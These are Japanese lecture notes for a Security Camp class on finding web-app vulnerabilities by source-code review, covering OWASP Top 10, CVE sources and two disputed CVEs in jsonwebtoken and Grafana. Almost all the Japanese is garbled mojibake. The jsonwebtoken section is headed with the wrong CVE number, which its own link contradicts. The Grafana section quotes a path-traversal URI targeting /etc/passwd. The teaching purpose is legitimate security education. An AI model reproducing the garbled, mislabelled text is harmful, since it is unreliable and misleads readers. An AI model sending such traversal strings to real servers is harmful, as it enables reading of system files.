# B6: ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰è§£æã«ã‚ˆã‚‹Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§èª¿æŸ»

# è¬›å¸«

## è¥¿è°·
- GMOã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ byã‚¤ã‚¨ãƒ©ã‚¨æ‰€å±
    - å‰è·: Yahoo! JAPAN
    - å‰è·ã§ã¯ç¤¾å†…ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ—ãƒ­ãƒ€ã‚¯ãƒˆé–‹ç™º

- SNS
    - X: @no1zy_sec

- ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ»ã‚­ãƒ£ãƒ³ãƒ—2022è¬›å¸«

## å±±å´
- GMOã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ byã‚¤ã‚¨ãƒ©ã‚¨æ‰€å±
    - å‰è·: LINEæ ªå¼ä¼šç¤¾
    - å‰è·ã§ã‚‚ç¾è·ã§ã‚‚ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰èª­ã‚“ã§ãƒã‚°æ¢ã—ã‚’ã—ã¦ã„ã‚‹

- SNS
    - X: @tyage
    - WebFinger: @blog.tyage.net@blog.tyage.net

- ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚­ãƒ£ãƒ³ãƒ—2010å’æ¥­ç”Ÿ
    - ã‚­ãƒ£ãƒ³ãƒ—ã§CTFã«è§¦ã‚Œã¦æœªã ã«CTFã‚„ã£ã¦ã¾ã™
- ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ»ã‚­ãƒ£ãƒ³ãƒ—2022è¬›å¸«

# äºˆå®šè¡¨

08/10

| æ™‚é–“          |                  |
| ------------- | ---------------- |
| 8:30 - 9:00   | ã‚¤ãƒ³ãƒˆãƒ­         |
| 9:00 - 9:20   | è„†å¼±æ€§èª¿æŸ» Part1 |
| 9:20 - 9:40   | è„†å¼±æ€§èª¿æŸ» Part2 |
| 9:40 - 10:00  | è„†å¼±æ€§èª¿æŸ» Part3 |
| 10:00 - 10:15 | ä¼‘æ†©             |
| 10:15 - 10:45 | CodeQL           |
| 10:45 - 11:15 | å®Ÿè·µCodeQL Part1 |
| 11:15 - 11:45 | å®Ÿè·µCodeQL Part2 |
| 11:45 - 12:15 | å®Ÿè·µCodeQL Part3 |


# ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰è§£æã«ã‚ˆã‚‹Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§èª¿æŸ»

ã€ŒWebã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¯ãƒ©ã‚¹ã€ãªã®ã§Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è©±ãŒä¸­å¿ƒ

* Webã‚¢ãƒ—ãƒªè‡ªä½“ã®è„†å¼±æ€§
* Webã‚¢ãƒ—ãƒªã§ã‚ˆãåˆ©ç”¨ã•ã‚Œã‚‹ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®è„†å¼±æ€§

## ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‹ã‚‰è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ã‚‰ã‚Œã‚‹ã¨ä¾¿åˆ©

* é–‹ç™ºæ™‚
  * ã“ã®ã‚³ãƒ¼ãƒ‰ã€ã“ã®è¨­è¨ˆå®‰å…¨ï¼Ÿ
  * ã“ã®OSSã§ã“ã®ä½¿ã„æ–¹ã—ã¦ã¦å¤§ä¸ˆå¤«ãªã‚“ã ã£ã‘ï¼Ÿ -> OSSã®èª¿æŸ»ã‚’ã—ã‚ˆã†
* ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ã¨ã—ã¦è„†å¼±æ€§ã‚’æ¢ã™è¦–ç‚¹
  * ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãŒãªãã¦ã‚‚ã€ã‚‚ã—ã“ã“ã§ã“ã†ã„ã†ã‚³ãƒ¼ãƒ‰ã ã£ãŸã‚‰è„†å¼±æ€§ã«ãªã‚‹ã‚ˆãªã¨ã„ã†æƒ³åƒãŒã§ãã‚‹ã‚ˆã†ã«ãªã‚‹
  * OSSã‚„ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®ã‚³ãƒ¼ãƒ‰ã€è¨ºæ–­ä¸­ã«æ‰‹ã«å…¥ã‚ŒãŸã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’èª¿æŸ»ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‚ˆã†ã«ãªã‚‹

### ã©ã†ã™ã‚Œã°ï¼Ÿ

ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰è¦‹ãªãŒã‚‰è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ã‚‹ã«ã¯ã€è„†å¼±æ€§ã®çŸ¥è­˜ã ã‘ã§ãªããƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ï¼ˆWebãªã‚‰ãƒ–ãƒ©ã‚¦ã‚¶ã¨ã‹ã‚¯ãƒ©ã‚¦ãƒ‰ã‚µãƒ¼ãƒ“ã‚¹ã¨ã‹ï¼‰ãƒ»è¨€èªãƒ»ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãƒ»ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®çŸ¥è­˜ãŒè¦æ±‚ã•ã‚Œã‚‹ã€‚
ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã«æ²¿ã£ã¦ã„ã‚‹ã‹ã€èª¤ã£ãŸä½¿ã„æ–¹ã‚’ã—ã¦ã„ãªã„ã‹ã€ä¸€èˆ¬çš„ãªå®Ÿè£…ã¨ä»Šè¦‹ã¦ã‚‹ã‚³ãƒ¼ãƒ‰ã¨ã¯ã©ã†ã„ã†ç‚¹ãŒé•ã†ã®ã‹ã€ã‚‚é‡è¦ãªè¦³ç‚¹ã€‚
ï¼ˆã‚ã€ã“ã‚ŒCTFã§è¦‹ãŸã“ã¨ã‚ã‚‹ã‚„ã¤ã ï¼ã‚‚çµæ§‹ã‚ã‚Šã¾ã™ã€‚ï¼‰

ã‚‚ã¡ã‚ã‚“é™çš„è§£æã ã‘ã§ãªãå®Ÿéš›ã«å‹•ä½œã•ã›ã¦ãƒ‡ãƒãƒƒã‚°ã—ãŸã‚Šå‹•ä½œç¢ºèªã™ã‚‹ã“ã¨ã‹ã‚‰å¾—ã‚‰ã‚Œã‚‹æƒ…å ±ã‚‚å¤šã„ã€‚
ã©ã†ä½¿ã‚ã‚Œã¦ã„ã‚‹ã®ã‹ãƒ»ä½•ãŒæƒ³å®šã•ã‚ŒãŸæŒ™å‹•ãªã®ã‹æƒ³åƒã™ã‚‹ã“ã¨ï¼ˆãƒªãƒãƒ¼ã‚¹ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ãƒªãƒ³ã‚°ã£ã½ã„ã“ã¨ï¼‰ãŒå¿…è¦ã«ãªã‚‹å ´åˆã‚‚ã€‚

è‰²ã€…æ›¸ãã¾ã—ãŸãŒã€å®æ¢ã—ã ã¨æ€ã£ã¦æ¥½ã—ã‚ã‚Œã°å¤§ä¸ˆå¤«ï¼

æœ¬æ—¥ã®ãƒ†ãƒ¼ãƒ

- å®Ÿéš›ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§å­˜åœ¨ã—ãŸè„†å¼±æ€§ã‚’å‚è€ƒã«èª¿æŸ»ã‚’ã—ã¦ã¿ã‚ˆã†
- é™çš„è§£æãƒ„ãƒ¼ãƒ«(CodeQL)ã«è§¦ã‚Œã¦ã¿ã‚ˆã†

### é™çš„è§£æã§è¦‹ã¤ã‘ã‚„ã™ã„è„†å¼±æ€§

é™çš„è§£æã ã‘ã§è¦‹ã¤ã‘ã‚„ã™ã„è„†å¼±æ€§ã€è¦‹ã¤ã‘ã‚‹ã®ãŒé›£ã—ã„è„†å¼±æ€§ãŒã‚ã‚‹ã®ã§ã€ãã“ã¯å¿µé ­ã«...
å¯èƒ½ãªã‚‰å®Ÿéš›ã®å‹•ä½œç’°å¢ƒã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦è¡Œã†å‹•çš„è§£æã¨çµ„ã¿åˆã‚ã›ã‚‹ã¨ã‚ˆã„

[OWASP TOP 10 <2021>](https://owasp.org/Top10/ja/)ã®å€‹äººçš„ãªæ‰€æ„Ÿ
OWASP TOP 10: ç™ºç”Ÿç‡ã‚„å½±éŸ¿ã€æ‚ªç”¨ã®ã—ã‚„ã™ã•ç­‰ã®ãƒ‡ãƒ¼ã‚¿ã‚’åŸºã«é¸å®šã•ã‚ŒãŸ10å€‹ã®è„†å¼±æ€§ã¨è„…å¨

|                                                     | é™çš„è§£æ(æ‰‹å‹•) | SASTãƒ„ãƒ¼ãƒ« | å‚™è€ƒ                                                                                                                                              |
| --------------------------------------------------- | -------- | ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
| A01:2021-ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã®ä¸å‚™                         | â—¯        | âœ—          | ä»•æ§˜ãŒãªã„ã¨åˆ¤æ–­ã§ããªã„è„†å¼±æ€§ãªã®ã§ã€ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰+SASTãƒ„ãƒ¼ãƒ«ã ã‘ã§ã¯ä¸€èˆ¬ã«æ¤œçŸ¥ãŒé›£ã—ã„ã‹ã‚‚                                                       |
| A02:2021-æš—å·åŒ–ã®å¤±æ•—                               | â—¯        | â—¯          | ã‚µãƒ¼ãƒã®è¨¼æ˜æ›¸ã®ã‚ˆã†ãªé‹ç”¨ä¸Šã®æš—å·åŒ–é–¢é€£éƒ¨åˆ†ã¯ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã«è¨˜è¿°ãŒãªã„ã“ã¨ã‚‚å¤šã„ã®ã§æ¤œçŸ¥ãŒé›£ã—ã„ã‹ã‚‚                                              |
| A03:2021-ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³                           | â—        | â—          | Taint Trackingã§æ¤œçŸ¥ã§ãã‚‹ã€‚                |
| A04:2021-å®‰å…¨ãŒç¢ºèªã•ã‚Œãªã„ä¸å®‰ãªè¨­è¨ˆ               | â—¯        | â–³          | ä»•æ§˜ã«é–¢é€£ã™ã‚‹è„†å¼±æ€§ãªã®ã§ã€ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰+SASTãƒ„ãƒ¼ãƒ«ã ã‘ã§ã¯ä¸€èˆ¬ã«æ¤œçŸ¥ãŒé›£ã—ã„ã‹ã‚‚ã€‚ãŸã ã—ã€ä¸€èˆ¬ã«ã‚»ã‚­ãƒ¥ã‚¢ã§ãªã„ãƒ‡ã‚¶ã‚¤ãƒ³ãƒ‘ã‚¿ãƒ¼ãƒ³ã¯æ¤œçŸ¥ã§ãã‚‹ã‹ã‚‚ã€‚ |
| A05:2021-ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è¨­å®šãƒŸã‚¹                     | â—¯        | â—¯          | é‹ç”¨ã«é–¢ã™ã‚‹è¨­å®šã¯ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ä¸­ã«è¨˜è¿°ãŒãªã„ã®ã§æ¤œçŸ¥ãŒé›£ã—ã„ã‹ã‚‚                                                                                  |
| A06:2021-è„†å¼±ã§å¤ããªã£ãŸã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆ             | â—        | â—          | ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ç®¡ç†ãƒ„ãƒ¼ãƒ«ã§ç®¡ç†ã•ã‚Œã¦ã„ã‚Œã°æ¤œçŸ¥ã—ã‚„ã™ã„ã€‚                                                                                              |
| A07:2021-è­˜åˆ¥ã¨èªè¨¼ã®å¤±æ•—                           | â—¯        | â–³          | èªè¨¼ãƒ­ã‚¸ãƒƒã‚¯ã®æ¤œçŸ¥ã¯â—¯ã€‚é‹ç”¨æ™‚ã«å¼±ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒè¨­å®šã•ã‚Œã¦ã„ã‚‹ã®ã¯æ¤œçŸ¥é›£ã—ã„âœ—ã€‚                                                                    |
| A08:2021-ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã¨ãƒ‡ãƒ¼ã‚¿ã®æ•´åˆæ€§ã®ä¸å…·åˆ       | â—¯        | â—¯          | å®‰å…¨ã§ãªã„ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã¯â—¯                                                                                                               |
| A09:2021-ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ­ã‚°ã¨ãƒ¢ãƒ‹ã‚¿ãƒªãƒ³ã‚°             | â—        | â—¯          | å‹•çš„è§£æã§ã¯é€†ã«æ¤œçŸ¥ã—ã¥ã‚‰ã„é …ç›®                                                                                                                  |
| A10:2021-ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒª(SSRF) | â—        | â—          |                                                                                                                                                   |

â€»å€‹äººçš„ãªæ‰€æ„Ÿã§ã™
â€»ã‚«ãƒ†ã‚´ãƒªã®ä¸­ã§ã‚‚è¦‹ã¤ã‘ã‚„ã™ã„ã‚‚ã®ã€è¦‹ã¤ã‘ã«ãã„ã‚‚ã®ãŒã‚ã‚Šã¾ã™

â†’ ä»Šå›ã¯ã€ãƒ¦ãƒ¼ã‚¶ãŒå…¥åŠ›ã—ãŸãƒ‡ãƒ¼ã‚¿ãŒã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã«å¿œã˜ãŸã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã‚’ã•ã‚Œãšã«ç›´æ¥ã¾ãŸã¯åˆ¥ã®ãƒ‡ãƒ¼ã‚¿ã¨é€£çµã•ã‚Œã¦åˆ©ç”¨ã•ã‚Œã¦ã—ã¾ã†ã€**ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§**ã®é™çš„è§£æã‚’ä¸­å¿ƒã«è¦‹ã¦ã„ãã¾ã™ã€‚
ã‚µãƒ¼ãƒ“ã‚¹ã®é‹ç”¨æ–¹æ³•ã‚„ä»•æ§˜ã«é–¢ã‚ã‚‰ãšã«è„†å¼±æ€§ã‚’æ¤œçŸ¥ã§ãã‚‹ã“ã¨ãŒå¤šã„ã®ã§ã€ãƒ„ãƒ¼ãƒ«ã§æ¤œçŸ¥ã—ã‚„ã™ã„ã€‚
å®Ÿéš›ã«ç™ºç”Ÿã™ã‚‹è„†å¼±æ€§ã®ä¸­ã§ã‚«ãƒãƒ¼ã§ãã‚‹ç¯„å›²ã‚‚ãã“ãã“å¤§ãã„ã€‚

### ä»–äººã®ã‚µãƒ¼ãƒ“ã‚¹ã‚„åºƒãåˆ©ç”¨ã•ã‚Œã¦ã‚‹ãƒ—ãƒ­ãƒ€ã‚¯ãƒˆã§è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ãŸã‚‰...?

ç›´æ¥å ±å‘Šã™ã‚‹ã®ãŒé›£ã—ã„å ´åˆã€æˆ‘ã‚‰ãŒIPAã«å ±å‘Šçª“å£ãŒã‚ã‚Šã¾ã™!

https://www.ipa.go.jp/security/todokede/vuln/uketsuke.html

åºƒãåˆ©ç”¨ã•ã‚Œã¦ã„ã‚‹ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã®è„†å¼±æ€§ã§ã‚ã‚Œã°ã€CVEãŒç™ºè¡Œã•ã‚Œã‚‹ã“ã¨ã‚‚ã€‚

# CVE

CVE: Common Vulnerabilities and Exposures
è„†å¼±æ€§ã®è­˜åˆ¥ç•ªå·

ä»Šå›ã®è¬›ç¾©ã§ã¯ã€CVEç•ªå·ã®ç™ºè¡Œã•ã‚ŒãŸè„†å¼±æ€§ã‚’ã„ãã¤ã‹å–ã‚Šä¸Šã’ã¾ã™ã€‚

è„†å¼±æ€§ã®ç™ºè¦‹ã•ã‚ŒãŸãƒ—ãƒ­ãƒ€ã‚¯ãƒˆ
ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³
è„†å¼±æ€§æ¦‚è¦/ç¨®é¡
å‚è€ƒæƒ…å ±

ãªã©ã®æƒ…å ±ãŒã¾ã¨ã‚ã‚‰ã‚Œã¦ã„ã‚‹ã€‚

CVEã¯åºƒãåˆ©ç”¨ã•ã‚Œã¦ã„ã‚‹ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã®è„†å¼±æ€§ã«å¯¾ã™ã‚‹ã‚‚ã®ãªã®ã§ã€ä¸€ä¼æ¥­ãŒé‹ç”¨ã—ã¦ã„ã‚‹å€‹åˆ¥ã®Webã‚µã‚¤ãƒˆï¼ˆtwitter.comã¨ã‹ï¼‰ã®è„†å¼±æ€§ã«ã¯åŸºæœ¬çš„ã«æ¡ç•ªã•ã‚Œãªã„ã€‚
https://www.cve.org/ResourcesSupport/AllResources/CNARules#section_7-4_requirements_for_assigning_a_cve_id

2022å¹´ã®CVEç™ºè¡Œæ•°ã¯25227ä»¶ã€‚
ï¼ˆæœ€è¿‘ã¯æ©Ÿæ¢°çš„ãªå ±å‘Šã‚‚ã‚ã£ã¦å¢—ãˆã¦ããŸã€‚ï¼‰

https://www.cvedetails.com/browse-by-date.php

![](https://tyage.github.io/seccamp-2023-images/upload_dcdd40a0d9b6b53e64586bbd8d604ef0.png)

æœ€æ–°CVEã‚’1å€‹è¦‹ã¦ã¿ã‚ˆã†
https://twitter.com/CVEnew

## CVEä»¥å¤–ã®è„†å¼±æ€§è­˜åˆ¥ç•ªå·

ä¼šç¤¾ã‚„æ©Ÿé–¢ã‚‚å€‹åˆ¥ã«æ¡ç•ªã—ã¦ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚
å…±é€šã®è­˜åˆ¥ç•ªå·ã¨ã—ã¦ã®CVEã€‚

- CERT/CC: VU#12345678
- JVN: JVN#12345678, JVNVU#12345678, JVNTA#12345678
- GitHub: GHSA-ab12-cd34-ef56
- Mozilla: MFSA 2023-01
- Red Hat: RHSA-2023:0001
- æ¨ªæ²³é›»æ©Ÿæ ªå¼ä¼šç¤¾: YSAR-23-0001


## CVEã®æ¢ã—æ–¹

CVEæ¢ã™ã‚½ãƒ¼ã‚¹

* [CVE.org](https://www.cve.org/)
* [CVE details](https://www.cvedetails.com/)
* [JVN iPedia](https://jvndb.jvn.jp/)
* [GitHub Advisories](https://github.com/advisories)
    * ãƒªãƒã‚¸ãƒˆãƒªã®å ´æ‰€ã‚„diffã€issueã€pull requestãŒæ›¸ã‹ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒé«˜ã„
    * reviewã‚¿ã‚°ãŒã‚ã‚‹ã®ã§å˜˜CVEã‚’å¼¾ã‘ã‚‹
* Hackerone, bugcrowd, ...
    * ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ 
* huntr.dev
    * OSSã®ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ 
    * ä¸€èˆ¬ã«OSSã«ãƒã‚°å ±å‘Šã—ã¦ã‚‚å ±å¥¨é‡‘ã¯ã‚‚ã‚‰ãˆãªã„ãŒã€OSSã”ã¨ã«å¯„ä»˜ã‚’é›†ã‚ã¦ã€è„†å¼±æ€§å ±å‘Šã—ãŸäººãŒãã“ã‹ã‚‰å ±å¥¨é‡‘ã‚’å—ã‘å–ã‚Œã‚‹ä»•çµ„ã¿
    * ä»®ã«å ±å¥¨é‡‘ãŒå—ã‘å–ã‚Œãªãã¨ã‚‚ã€OSSãƒ¡ãƒ³ãƒ†ãƒŠã¸ã®é€£çµ¡ã‚’huntr.devãŒè¡Œã£ã¦ãã‚Œã‚‹ã®ã§å ±å‘Šè€…ç›®ç·šã§ã¯ä¾¿åˆ©
        * æœ€è¿‘ã¯GitHubä¸Šã§è„†å¼±æ€§å ±å‘Šã§ãã‚‹ä»•çµ„ã¿ãŒæ•´ãˆã‚‰ã‚Œã¦ããŸã‘ã‚Œã©
    * PoCï¼ˆProof of Concept: æ”»æ’ƒãŒæˆåŠŸã™ã‚‹ã“ã¨ã‚’è¨¼æ˜ã™ã‚‹ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚„è¨¼è·¡ï¼‰ãŒã‚ã‚‹ã®ã§ã™ãã«è„†å¼±æ€§ãŒåˆ†ã‹ã‚‹ã‹ã‚‚
* ChatGPT

## ä½™è«‡: å˜˜CVE

CVEãŒç™ºè¡Œã•ã‚Œã¦ã„ã¦ã‚‚ç¢ºå®Ÿã«è„†å¼±æ€§ãŒã‚ã‚‹ã¨ã¯é™ã‚‰ãªã„ã€‚

å ±å‘Šè€…ãŒã‹ãªã‚Šç››ã£ãŸå ±å‘Šã‚’ã—ã€é–‹ç™ºè€…ã‚„CVEç™ºè¡Œè€…ãŒã¡ã‚ƒã‚“ã¨ç¢ºèªã›ãšã«ç™ºè¡Œã™ã‚‹å ´åˆã‚‚ã‚ã‚‹ã€‚

å˜˜CVEã¨ã¾ã§ã¯ã„ã‹ãªãã¨ã‚‚ã€ãŠã‹ã—ãªãƒªã‚¹ã‚¯è©•ä¾¡å€¤(CVSS)ãŒã¤ã‘ã‚‰ã‚Œã¦ã„ã‚‹ã“ã¨ã‚‚ã€‚

ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’èª­ã¿è§£ã„ã¦è„†å¼±æ€§ã‚’æ¢ã™æŠ€è¡“ãŒã‚ã‚Œã°ã€è„†å¼±æ€§ãŒæœ¬å½“ã«å­˜åœ¨ã™ã‚‹ã‹è¦‹æŠœãã‚„ã™ã„...ã‹ã‚‚

æœ€è¿‘ã®å˜˜CVEäº‹ä»¶

### CVE-2022-32276
jsonwebtokenã¨ã„ã†ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã«RCEãŒè¦‹ã¤ã‹ã£ãŸï¼ˆã¨ã•ã‚ŒãŸï¼‰ã€‚

2ä¸‡ã‚’è¶…ãˆã‚‹ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ãŒåˆ©ç”¨ã—ã¦ãŠã‚Šã€ã¡ã‚‡ã£ã¨ã—ãŸé¨’ãã«ã€‚

ä¿®æ­£ã‚³ãƒŸãƒƒãƒˆã‚’èª­ã‚“ã§ã¿ã¦ã‚‚ã€ç‰¹ã«è„†å¼±æ€§ã®å¯¾ç­–ãŒè¡Œã‚ã‚Œã¦ã„ã‚‹é›°å›²æ°—ã¯ãªã„...
https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3

å ±å‘Šã—ãŸä¼šç¤¾ãŒãƒ¤ãƒã„è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ãŸã¨ã‚¢ãƒ”ãƒ¼ãƒ«ã€‚
â†’ ã“ã‚Œã¯è„†å¼±æ€§ãªã®ã‹???ã¨è©±é¡Œã«

![](https://tyage.github.io/seccamp-2023-images/upload_11de060cac34242ee9b6cd85af8c2f85.png)
https://twitter.com/unit42_jp/status/1612976481579286531
https://unit42.paloaltonetworks.jp/jsonwebtoken-vulnerability-cve-2022-23529/

ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ãƒ¡ã‚½ãƒƒãƒ‰ `jwt.verify`ã€€ã®å¼•æ•°ã« `{ toString: () => console.log('PWNED!') }` ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’æ¸¡ã›ã°é–¢æ•°ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¨ã„ã†PoC(å®Ÿè¨¼ã‚³ãƒ¼ãƒ‰)ãŒè²¼ã‚‰ã‚Œã¦ã„ãŸã€‚

![](https://tyage.github.io/seccamp-2023-images/upload_b6af86721d5fd04e76997ce016eedefb.png)

é€šå¸¸ã€é–‹ç™ºè€…ä»¥å¤–ãŒã“ã®ã‚ˆã†ãªã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä»•è¾¼ã‚€ã“ã¨ã¯å›°é›£ã€‚
ã‚‚ã—ã“ã‚ŒãŒè„†å¼±æ€§ãªã‚‰ã€ãŸã ã®å‡¦ç†ç³»æ¨™æº–ã® `console.log` ã‚„ã‚ã‚Šã¨ã‚ã‚‰ã‚†ã‚‹ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒè„†å¼±æ€§ã«ãªã£ã¦ã—ã¾ã†ã€‚

ã€ŒThis CVE is a jokeã€ã¨ç‚ä¸Šã—ã€ã“ã®CVEã¯ç„¡äº‹ã«å–ã‚Šä¸‹ã’ã‚‰ã‚ŒãŸã€‚
ï¼ˆCVEãŒRejectã•ã‚Œã‚‹ã“ã¨ã¯ãã‚“ãªã«å¤šããªã„ãŸã‚ã“ã‚Œã¯ãƒ¬ã‚¢ã‚±ãƒ¼ã‚¹ã€‚ï¼‰

https://github.com/github/advisory-database/pull/1595

![](https://tyage.github.io/seccamp-2023-images/upload_7104917582f69150b6071e3560c5bdb8.png)


### CVE-2022-32276, CVE-2022-32275

> Grafana 8.4.3 allows reading files via (for example) a /dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd URI.

è„†å¼±æ€§ã®å†…å®¹ã¯ä¸€è¦‹ã‚µãƒ¼ãƒå†…éƒ¨ã® /etc/passwd ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒªãƒ¢ãƒ¼ãƒˆã‹ã‚‰èª­ã‚ã‚‹LFIã®ã‚ˆã†ã«è¦‹ãˆã‚‹ãŒ...

å®Ÿéš›ã«ã¯ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ãªãã¦ã‚‚404 Not Foundã®ç”»é¢ã‚’è¦‹ã‚‹ã¨ã€ŒãƒŠãƒ“ã‚²ãƒ¼ã‚·ãƒ§ãƒ³ãƒãƒ¼ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã€ã¨ã„ã†å†…å®¹ã€‚

ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ãªãã¦ã‚‚ãƒŠãƒ“ã‚²ãƒ¼ã‚·ãƒ§ãƒ³ãƒãƒ¼ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã®ã¯ãŠã‹ã—ã„ï¼ã¨ã„ã†ä¸»å¼µã€‚
ï¼ˆUIä¸Šè¡¨ç¤ºã•ã‚Œã‚‹ã ã‘ã§ã€å®Ÿéš›ã«ãƒ‡ãƒ¼ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ã‘ã§ã¯ãªã„ã€‚ï¼‰

![](https://user-images.githubusercontent.com/20999846/173608475-5ead4e2e-ce14-48ab-b42d-4a74809ae106.png)

PoCã¨ã•ã‚ŒãŸã‚‚ã®: https://github.com/BrotherOfJhonny/grafana/tree/d5b5d463114e127d1139a277ec05511c24aeac33

MITREãŒãªãœã‹CVEã‚’ç™ºè¡Œã—ã¦ã—ã¾ã£ãŸãŸã‚ã€Grafanaå…¬å¼ã«ã“ã‚Œã¯è„†å¼±æ€§ã§ã¯ãªã„ã¨èª¬æ˜ã‚’ã™ã‚‹ã“ã¨ã«ã€‚
CVEã®èª¬æ˜æ–‡ã¯æ›´æ–°ã•ã‚ŒãŸã‚‚ã®ã®ã€ç¾åœ¨ã‚‚å–ã‚Šä¸‹ã’ã‚‰ã‚Œã¦ã¯ã„ãªã„ã€‚

https://grafana.com/blog/2022/06/07/cve-2022-32276-and-cve-2022-32275-no-current-evidence-of-security-impact/

## Taint Tracking

ã“ã‚Œã‹ã‚‰è¡Œã†èª¿æŸ»ã§ã¯ãƒ¦ãƒ¼ã‚¶ãŒé€ä¿¡ã—ãŸè„†å¼±æ€§ã‚’å¼•ãèµ·ã“ã—ã†ã‚‹å€¤ãŒã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã§ã©ã†ä¼æ¬ã—ã¦ã„ãã‹ã‚’è¿½ã£ã¦ã„ãã¾ã™ã€‚
ã“ã®ã‚ˆã†ãªæ‰‹æ³•ã¯Taint Trackingã¨å‘¼ã°ã‚Œã¦ãŠã‚Šã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ã‚‹ä¸Šã§æœ‰åŠ¹ãªæ‰‹æ³•ã®ä¸€ã¤ã§ã™ã€‚

